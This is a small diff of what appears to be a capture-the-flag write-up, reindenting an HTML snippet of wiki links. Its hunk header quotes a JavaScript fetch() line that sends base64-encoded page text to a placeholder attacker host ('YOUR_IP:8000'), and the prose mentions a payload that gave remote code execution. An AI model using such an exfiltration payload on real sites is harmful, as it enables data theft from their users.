@@ -190,13 +190,9 @@ fetch('http://YOUR_IP:8000/?y=' + btoa(text), {mode:'no-cors'});
 In response to this POST to the wiki endpoint we find a way to inspect the effects of our payloads by visiting the created wikis:
 
 ```html
-        <li>
-          <a class="btn-enlarge" href="/wiki/1">My New Wiki</a>
-        </li>
-        
-        <li>
-          <a class="btn-enlarge" href="/wiki/2">My New Wiki</a>
-        </li>
+<li>
+<a class="btn-enlarge" href="/wiki/1">My New Wiki</a>
+</li>
 ```
 
 After **a lot of struggling** we found this payload that finally gives us RCE:
